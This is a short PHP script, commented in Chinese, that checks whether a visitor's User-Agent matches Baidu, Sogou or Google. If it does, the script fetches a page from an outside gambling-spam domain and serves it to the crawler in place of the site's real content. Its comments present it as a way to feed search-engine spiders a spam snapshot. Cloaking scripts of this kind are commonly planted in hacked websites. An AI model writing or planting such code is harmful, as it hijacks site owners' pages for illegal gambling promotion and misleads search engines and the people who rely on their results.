<?php
/**
 * Author: night
 * Date: 2016/7/19
 * Time: 10:05
 */

$a = array();
$a[] = 'http://www.baidu.com';
$a[] = 'http://www.sogou.com';
$a[] = 'http://www.google.com';
//下面继续追加其他搜索引擎


foreach($a as $b){
    if(ereg($b,$_SERVER["HTTP_USER_AGENT"])){
        //判断搜索引擎，执行跳转，这里判断的是百度。

        $file = file_get_contents('http://www.guipian.cc/aomenduchang/bcpjw/');
        echo $file;//提供给百度蜘蛛抓取的页面，也就是快照。
        exit;
    }
}
